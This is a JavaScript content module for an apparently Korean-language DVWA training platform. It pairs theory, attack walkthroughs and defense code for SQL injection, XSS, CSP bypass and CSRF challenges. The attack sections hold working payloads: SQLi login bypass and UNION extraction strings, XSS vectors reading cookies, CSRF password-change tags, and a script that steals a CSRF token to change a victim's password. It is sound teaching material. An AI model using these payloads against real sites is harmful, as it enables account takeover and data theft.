// challengeContent.js
// ─────────────────────────────────────────────────────────────
// 챌린지별 학습 콘텐츠 (이론 / 공격 풀이 / 방어 코드)
//
// key 는 문제 제목(title)과 정확히 일치시킵니다.
// DB에 id나 slug 컬럼이 있다면 그 값을 key로 바꿔 매칭하는 편이 더 안전합니다.
//
// 각 블록(block) 타입:
//   { type: "p",    text: "문단 텍스트" }
//   { type: "h",    text: "소제목" }
//   { type: "code", text: "코드/페이로드" }
//   { type: "list", items: ["항목1", "항목2"] }
//
// 페이로드 안의 <DVWA> 는 학습자의 DVWA 호스트(예: http://localhost:8080)로 바꿔 읽으세요.
// ─────────────────────────────────────────────────────────────

export const challengeContent = {
  /* ===================== SQL Injection ===================== */

  "Login Bypass": {
    theory: {
      summary:
        "로그인 폼이 입력값을 그대로 SQL 쿼리에 이어붙이기 때문에, 따옴표 하나로 쿼리의 의미 자체를 바꿔버릴 수 있습니다.",
      blocks: [
        { type: "h", text: "왜 생길까?" },
        {
          type: "p",
          text: "서버는 보통 아래처럼 사용자가 입력한 아이디·비밀번호를 문자열로 이어붙여 쿼리를 만듭니다.",
        },
        {
          type: "code",
          text: "SELECT * FROM users\nWHERE user = '$user' AND password = '$pass';",
        },
        {
          type: "p",
          text: "이때 입력값을 검증·이스케이프하지 않으면, 공격자가 따옴표(')로 문자열을 닫고 그 뒤에 원하는 SQL 논리를 끼워 넣을 수 있습니다. 입력이 '데이터'가 아니라 '코드'로 해석되는 것이 핵심입니다.",
        },
        { type: "h", text: "인증 우회의 원리" },
        {
          type: "p",
          text: "비밀번호를 검사하는 AND password = '...' 조건을 항상 참으로 만들거나, 주석으로 통째로 무력화하면 비밀번호를 몰라도 로그인 검사를 통과하게 됩니다.",
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 주입 가능 여부 확인" },
        {
          type: "p",
          text: "아이디 칸에 따옴표(') 하나만 넣고 시도해 봅니다. SQL 에러가 나거나 동작이 달라지면 입력이 쿼리에 그대로 반영된다는 신호입니다.",
        },
        { type: "h", text: "2. 항상 참인 조건 주입" },
        { type: "code", text: "' OR '1'='1" },
        {
          type: "p",
          text: "쿼리가 ... WHERE user = '' OR '1'='1' AND ... 형태가 되어 조건이 참이 되고 첫 번째 행이 반환됩니다.",
        },
        { type: "h", text: "3. 주석으로 비밀번호 검사 제거" },
        { type: "code", text: "admin' -- " },
        {
          type: "p",
          text: "-- 뒤쪽(공백 포함)이 주석 처리되어 AND password = '...' 부분이 통째로 사라집니다. 결과적으로 admin 계정으로 로그인됩니다. (DVWA Low 의 User ID 폼이라면 1' OR '1'='1 로 전체 사용자 노출도 확인해 보세요.)",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "Prepared Statement (파라미터 바인딩)" },
        {
          type: "p",
          text: "쿼리의 '구조'와 '데이터'를 분리해, 사용자 입력이 절대 코드로 해석되지 않게 합니다. SQL Injection의 가장 근본적인 방어책입니다.",
        },
        {
          type: "code",
          text: '$stmt = $conn->prepare(\n  "SELECT * FROM users WHERE user = ? AND password = ?"\n);\n$stmt->bind_param("ss", $user, $pass);\n$stmt->execute();',
        },
        { type: "h", text: "추가 방어" },
        {
          type: "list",
          items: [
            "입력 검증: 허용된 형식(화이트리스트)만 통과시키기",
            "DB 계정 최소 권한: 애플리케이션 계정에 DROP·관리 권한 주지 않기",
            "에러 메시지 숨김: DB 에러 원문을 사용자 화면에 노출하지 않기",
          ],
        },
      ],
    },
  },

  "Union Attack": {
    theory: {
      summary:
        "UNION SELECT 는 두 쿼리의 결과를 세로로 합칩니다. 이를 악용하면 원래 조회하던 테이블이 아닌 다른 테이블(예: 사용자 비밀번호)을 결과에 끼워 넣어 화면에 노출시킬 수 있습니다.",
      blocks: [
        { type: "h", text: "전제 조건" },
        {
          type: "p",
          text: "UNION 으로 두 SELECT 를 합치려면 양쪽의 컬럼 '개수'가 같아야 하고, 자료형도 호환되어야 합니다. 그래서 공격은 컬럼 수를 알아내는 단계부터 시작합니다.",
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 컬럼 수 알아내기" },
        { type: "code", text: "' ORDER BY 1 -- \n' ORDER BY 2 -- \n' ORDER BY 3 -- " },
        {
          type: "p",
          text: "숫자를 1씩 늘리다가 에러가 나는 직전 숫자가 컬럼 개수입니다. (DVWA sqli 폼은 컬럼이 2개입니다.)",
        },
        { type: "h", text: "2. 출력되는 위치 확인" },
        { type: "code", text: "' UNION SELECT NULL, NULL -- " },
        {
          type: "p",
          text: "NULL 자리를 1, 2 같은 값으로 바꿔, 화면 어느 자리에 결과가 보이는지 확인합니다.",
        },
        { type: "h", text: "3. 실제 데이터 추출" },
        { type: "code", text: "' UNION SELECT user, password FROM users -- " },
        { type: "h", text: "4. 구조를 모를 때 (information_schema)" },
        {
          type: "code",
          text: "' UNION SELECT table_name, column_name\n  FROM information_schema.columns -- ",
        },
        {
          type: "p",
          text: "테이블·컬럼 이름을 먼저 열거한 뒤, 알아낸 이름으로 다시 데이터를 추출합니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "Prepared Statement 로 입력을 쿼리 구조에서 분리",
            "DB 에러·예외를 사용자에게 그대로 노출하지 않기",
            "정말 필요한 컬럼만 SELECT 하고, 민감 데이터는 응답에서 제외",
            "비밀번호는 평문 저장 금지 — 솔트 적용 해시(bcrypt 등)로 저장",
          ],
        },
      ],
    },
  },

  "Blind SQLi": {
    theory: {
      summary:
        "쿼리 결과나 에러가 화면에 직접 보이지 않아도, 참/거짓에 따라 응답이 달라지거나 응답 시간이 달라지는 것을 이용해 데이터를 한 글자씩 알아낼 수 있습니다.",
      blocks: [
        { type: "h", text: "두 가지 방식" },
        {
          type: "list",
          items: [
            "Boolean 기반: 조건이 참일 때와 거짓일 때 페이지 응답(있음/없음)이 달라지는 것을 관찰",
            "Time 기반: 응답 내용 차이도 안 보일 때, 조건이 참이면 일부러 지연시켜 시간 차이로 판단",
          ],
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 주입 가능 여부 확인 (Boolean)" },
        { type: "code", text: "1' AND 1=1 -- \n1' AND 1=2 -- " },
        {
          type: "p",
          text: "위는 정상 응답, 아래는 다른 응답이 나오면 Blind 주입이 가능하다는 뜻입니다.",
        },
        { type: "h", text: "2. 한 글자씩 추출 (Boolean)" },
        {
          type: "code",
          text: "1' AND SUBSTRING(\n  (SELECT password FROM users LIMIT 1), 1, 1\n) = 'a' -- ",
        },
        {
          type: "p",
          text: "참일 때만 '정상' 응답이 돌아옵니다. 비교 문자를 a, b, c... 로 바꿔가며 첫 글자를 찾고, 위치를 2,3... 으로 늘려 전체를 복원합니다.",
        },
        { type: "h", text: "3. 시간 기반 (응답 차이도 안 보일 때)" },
        { type: "code", text: "1' AND IF(1=1, SLEEP(3), 0) -- " },
        {
          type: "p",
          text: "응답이 3초 지연되면 조건이 참입니다. 글자 추측에도 SLEEP 을 조합해 시간 차로 판단할 수 있습니다. 수작업은 비현실적으로 느리므로, 원리를 이해한 뒤 sqlmap 같은 도구로 자동화 과정을 학습하면 좋습니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "Prepared Statement 사용 (모든 SQLi의 공통 근본 방어)",
            "참/거짓에 따라 응답·에러가 달라지지 않도록 일관되게 처리",
            "요청 속도 제한(rate limit)으로 자동화 도구의 대량 시도 차단",
            "WAF 등으로 비정상 패턴 탐지·차단 보조",
          ],
        },
      ],
    },
  },

  /* ===================== XSS ===================== */

  "Reflected XSS": {
    theory: {
      summary:
        "서버가 사용자 입력을 검증·이스케이프 없이 그대로 HTML 응답에 출력하면, 입력에 넣은 스크립트가 피해자의 브라우저에서 실행됩니다.",
      blocks: [
        { type: "h", text: "Reflected 의 의미" },
        {
          type: "p",
          text: "입력한 값이 같은 요청의 응답에 즉시 '반사'되어 나타나는 형태입니다. 보통 악성 링크를 피해자가 클릭하도록 유도해 공격합니다.",
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 입력이 어디에 출력되는지 확인" },
        {
          type: "p",
          text: "입력창(또는 URL의 name 파라미터)에 평범한 문자열을 넣고, 그 값이 페이지 HTML에 그대로 찍히는지 봅니다.",
        },
        { type: "h", text: "2. 기본 페이로드" },
        { type: "code", text: "<script>alert(1)</script>" },
        { type: "h", text: "3. 태그 필터를 우회할 때" },
        { type: "code", text: "<img src=x onerror=alert(document.cookie)>" },
        {
          type: "p",
          text: "script 태그가 막혀 있으면 이벤트 핸들러(onerror 등)를 이용합니다. 실제 공격에서는 alert 대신 쿠키·세션 탈취 코드가 들어갑니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "출력 인코딩: HTML로 출력할 때 < > & \" 등을 엔티티로 이스케이프",
            "Content-Security-Policy(CSP) 로 인라인 스크립트 실행 차단",
            "입력 검증과 신뢰할 수 없는 데이터의 DOM 직접 삽입 금지",
          ],
        },
      ],
    },
  },

  "DOM XSS": {
    theory: {
      summary:
        "서버를 거치지 않고, 브라우저의 JavaScript가 URL 같은 입력을 DOM에 직접 써넣을 때 발생합니다. 응답 HTML에는 흔적이 없어 서버 로그만으로는 잡기 어렵습니다.",
      blocks: [
        { type: "h", text: "Source 와 Sink" },
        {
          type: "p",
          text: "공격자가 제어하는 입력(Source)이 검증 없이 위험한 DOM API(Sink)에 전달될 때 터집니다. 대표적인 Source 는 location.href / location.hash / 쿼리 파라미터이고, 대표적인 Sink 는 document.write() · innerHTML 입니다.",
        },
        {
          type: "p",
          text: "Reflected XSS 와 달리 서버 응답 본문에는 페이로드가 보이지 않습니다. 그래서 페이지 소스가 아니라 개발자도구의 Elements(실제 DOM) 탭에서 결과를 확인해야 합니다.",
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 파라미터가 DOM에 들어가는지 확인" },
        {
          type: "p",
          text: "DVWA DOM XSS 는 URL 의 default 값을 JavaScript 가 읽어 document.write 로 <option> 에 써넣습니다. 개발자도구 Elements 탭에서 입력값이 그대로 들어가는지 봅니다.",
        },
        { type: "h", text: "2. Low — 태그 닫고 주입" },
        {
          type: "code",
          text: "?default=English</option></select><script>alert(1)</script>",
        },
        {
          type: "p",
          text: "select/option 을 먼저 닫은 뒤 스크립트를 이어 붙입니다.",
        },
        { type: "h", text: "3. 필터 우회 — 이벤트 핸들러" },
        {
          type: "code",
          text: "?default=</option></select><img src=x onerror=alert(1)>",
        },
        { type: "h", text: "4. 화이트리스트(High) — 프래그먼트 활용" },
        { type: "code", text: "?default=English#<script>alert(1)</script>" },
        {
          type: "p",
          text: "# 뒤(프래그먼트)는 서버로 전송되지 않지만, 클라이언트 JS 는 location.href 전체를 읽기 때문에 서버측 화이트리스트 검사를 피해갈 수 있습니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "위험한 Sink 회피: innerHTML / document.write 대신 textContent · createElement 사용",
            "DOM 에 넣기 전 입력을 인코딩하고, 신뢰 목록과 정확히 일치하는 값만 사용",
            "DOMPurify 같은 검증된 라이브러리로 살균(sanitize)",
            "CSP 로 인라인·외부 스크립트 실행 제한",
          ],
        },
      ],
    },
  },

  "CSP Bypass": {
    theory: {
      summary:
        "CSP(Content Security Policy)는 어떤 출처의 스크립트를 실행할지 제한해 XSS를 완화합니다. 하지만 정책 자체에 허점(느슨한 허용 도메인, unsafe-inline, JSONP 등)이 있으면 우회할 수 있습니다.",
      blocks: [
        { type: "h", text: "CSP 가 막는 것" },
        {
          type: "p",
          text: "script-src 등의 지시문으로 '허용된 출처'의 스크립트만 실행하게 합니다. 따라서 단순한 <script>alert(1)</script> 인라인 주입은 차단됩니다.",
        },
        { type: "h", text: "그런데 왜 뚫리나" },
        {
          type: "list",
          items: [
            "허용 도메인이 너무 넓음: 공격자가 그 도메인에 스크립트를 올릴 수 있는 경우",
            "JSONP 엔드포인트: 허용 도메인이 callback 파라미터로 임의 코드를 반환",
            "unsafe-inline 허용: 인라인 스크립트가 그대로 실행됨",
          ],
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. CSP 헤더 확인" },
        {
          type: "p",
          text: "개발자도구 Network 탭에서 응답의 Content-Security-Policy 헤더를 열어 script-src 에 허용된 도메인 목록을 파악합니다.",
        },
        { type: "h", text: "2. 허용 도메인에 스크립트 호스팅" },
        {
          type: "code",
          text: '<script src="https://<허용도메인>/yourscript.js"></script>',
        },
        {
          type: "p",
          text: "허용된 출처라서 CSP 검사를 통과합니다. DVWA Low 는 입력란에 이 태그를 제출하는 방식입니다.",
        },
        { type: "h", text: "3. JSONP 엔드포인트로 임의 실행" },
        {
          type: "code",
          text: '<script src="https://<허용도메인>/jsonp?callback=alert(1)"></script>',
        },
        {
          type: "p",
          text: "허용 도메인에 callback 파라미터를 그대로 함수로 감싸 반환하는 JSONP 엔드포인트가 있으면, callback 자리에 코드를 넣어 실행시킬 수 있습니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "허용 도메인을 최소화하고, 사용자가 콘텐츠를 올릴 수 있는 도메인은 신뢰 목록에서 제외",
            "unsafe-inline 제거 — nonce 또는 해시 기반으로 인라인 스크립트 허용",
            "strict-dynamic 적용으로 신뢰된 스크립트만 추가 로드 허용",
            "JSONP 의존 제거(가능하면 CORS 기반 API 로 대체)",
          ],
        },
      ],
    },
  },

  /* ===================== CSRF ===================== */

  "Just Click It": {
    theory: {
      summary:
        "CSRF는 로그인된 피해자의 브라우저가 요청에 인증 쿠키를 자동으로 실어 보낸다는 점을 악용합니다. 피해자가 악성 페이지나 이미지를 보는 것만으로, 의도하지 않은 상태 변경 요청이 전송됩니다.",
      blocks: [
        { type: "h", text: "왜 통할까?" },
        {
          type: "p",
          text: "브라우저는 특정 사이트로 요청을 보낼 때 그 사이트의 쿠키를 자동으로 첨부합니다. 상태를 바꾸는 요청(비밀번호 변경 등)이 예측 가능한 GET 이고, 토큰·Referer 같은 추가 검증이 없다면, 공격자는 그 요청을 미리 만들어 피해자가 대신 보내게 만들 수 있습니다.",
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 정상 요청 관찰" },
        {
          type: "code",
          text: "GET /vulnerabilities/csrf/?password_new=...&password_conf=...&Change=Change",
        },
        {
          type: "p",
          text: "비밀번호 변경이 GET 으로 동작하고, CSRF 토큰도 Referer 검사도 없는 것을 확인합니다.",
        },
        { type: "h", text: "2. 공격 URL 구성 (목표 비밀번호: csrf1234)" },
        {
          type: "code",
          text: "http://<DVWA>/vulnerabilities/csrf/?password_new=csrf1234&password_conf=csrf1234&Change=Change",
        },
        { type: "h", text: "3. img 태그 하나로 자동 실행" },
        {
          type: "code",
          text: '<img src="http://<DVWA>/vulnerabilities/csrf/?password_new=csrf1234&password_conf=csrf1234&Change=Change">',
        },
        {
          type: "p",
          text: "로그인된 피해자가 이 태그가 있는 페이지를 열기만 하면, 브라우저가 쿠키와 함께 요청을 보내 비밀번호가 csrf1234 로 바뀝니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "예측 불가능한 CSRF 토큰을 폼마다 발급하고 서버에서 검증",
            "쿠키에 SameSite=Lax/Strict 적용으로 교차 사이트 자동 전송 차단",
            "상태 변경은 GET 대신 POST 로, 토큰과 함께 처리",
            "민감한 변경(비밀번호 등)은 현재 비밀번호 재확인 요구",
          ],
        },
      ],
    },
  },

  "Referer Madness": {
    theory: {
      summary:
        "Referer 헤더로 요청 출처를 검증해 CSRF를 막으려 하지만, 완전 일치가 아니라 '문자열 포함' 같은 느슨한 검사는 쉽게 우회됩니다.",
      blocks: [
        { type: "h", text: "약점은 검사 방식" },
        {
          type: "p",
          text: "Medium 레벨은 Referer 헤더 안에 서버 호스트명이 '포함'되어 있는지만 확인합니다. 정확한 출처 일치가 아니라 부분 문자열 검사이기 때문에, 공격자가 Referer 에 그 호스트명 문자열만 끼워 넣으면 통과됩니다.",
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 검사 우회 아이디어" },
        {
          type: "p",
          text: "공격 페이지에서 보낸 요청의 Referer 에 타겟 호스트명(예: 127.0.0.1) 문자열이 들어가게 만들면 됩니다.",
        },
        { type: "h", text: "2. 호스트명을 URL에 포함시키기" },
        { type: "code", text: "http://<공격서버>/csrf.html?127.0.0.1" },
        {
          type: "p",
          text: "공격 페이지의 URL(경로·파일명·쿼리)에 타겟 호스트명을 넣어두면, 그 페이지가 보낸 요청의 Referer 에 해당 문자열이 포함됩니다.",
        },
        { type: "h", text: "3. 그 페이지에서 비밀번호 변경 요청 (목표: csrf5678)" },
        {
          type: "code",
          text: '<img src="http://<DVWA>/vulnerabilities/csrf/?password_new=csrf5678&password_conf=csrf5678&Change=Change">',
        },
        {
          type: "p",
          text: "Referer 포함 검사를 통과하면서 요청이 전송되어 비밀번호가 csrf5678 로 변경됩니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "Referer 만으로 검증하지 말 것 — 부분 포함이 아닌 정확한 출처(origin) 일치로 검사",
            "CSRF 토큰을 병행해 출처 검증을 보강",
            "SameSite 쿠키로 교차 사이트 요청 자체를 차단",
            "Referer 가 비어 있는 경우의 처리 정책도 명확히 정의",
          ],
        },
      ],
    },
  },

  "Token Thief": {
    theory: {
      summary:
        "CSRF 토큰은 직접적인 CSRF를 막지만, 같은 사이트에 XSS가 함께 존재하면 공격자가 동일 출처에서 토큰을 읽어내 유효한 요청을 위조할 수 있습니다. 두 취약점이 결합되면 토큰 방어가 무력화됩니다.",
      blocks: [
        { type: "h", text: "토큰 방어의 전제" },
        {
          type: "p",
          text: "CSRF 토큰은 '공격자가 토큰 값을 모른다'는 전제 위에서 동작합니다. 그런데 XSS 가 있으면 공격 코드가 피해자의 브라우저(동일 출처) 안에서 실행되므로, 토큰이 들어 있는 페이지를 읽어 토큰을 그대로 가져올 수 있습니다.",
        },
        {
          type: "p",
          text: "이 때문에 'XSS 가 있으면 CSRF 토큰도 안전하지 않다'고 말합니다. 근본 해결은 XSS 를 없애는 것입니다.",
        },
      ],
    },
    attack: {
      blocks: [
        { type: "h", text: "1. 직접 위조 불가 확인" },
        {
          type: "p",
          text: "CSRF 페이지에 user_token 숨은 필드가 있어, 토큰 없이 보낸 요청은 거부됩니다.",
        },
        { type: "h", text: "2. Stored XSS 로 토큰 읽고 요청 전송" },
        {
          type: "p",
          text: "방명록 등 Stored XSS 지점에 아래 같은 스크립트를 심습니다. 동일 출처라 fetch 로 CSRF 페이지를 읽어 토큰을 파싱한 뒤, 그 토큰을 포함해 비밀번호 변경 요청을 보냅니다.",
        },
        {
          type: "code",
          text:
            "fetch('/vulnerabilities/csrf/', { credentials: 'include' })\n" +
            "  .then(r => r.text())\n" +
            "  .then(html => {\n" +
            "    const token = html.match(/user_token. value=.([0-9a-f]+)/)[1];\n" +
            "    const url = '/vulnerabilities/csrf/?password_new=csrf9999'\n" +
            "      + '&password_conf=csrf9999&Change=Change&user_token=' + token;\n" +
            "    fetch(url, { credentials: 'include' });\n" +
            "  });",
        },
        {
          type: "p",
          text: "두 요청 모두 credentials: 'include' 로 세션 쿠키를 함께 보내야 합니다. (위 정규식은 user_token 숨은 필드의 value 를 뽑아내는 예시입니다.) 성공하면 비밀번호가 csrf9999 로 변경됩니다.",
        },
      ],
    },
    defense: {
      blocks: [
        { type: "h", text: "방어 방법" },
        {
          type: "list",
          items: [
            "근본 원인인 XSS 를 제거: 출력 인코딩 + CSP (이것이 핵심)",
            "CSRF 토큰만으로 안전하다고 가정하지 말 것 — XSS 와 묶어서 함께 점검",
            "SameSite 쿠키로 교차 사이트 요청 차단 보강",
            "비밀번호 변경 등 민감 작업은 현재 비밀번호 재확인 요구",
          ],
        },
      ],
    },
  },
};

// 선택된 문제에 맞는 콘텐츠를 반환 (없으면 null → UI에서 "준비 중" 표시)
export function getChallengeContent(selected) {
  if (!selected) return null;
  return challengeContent[selected.title] || null;
}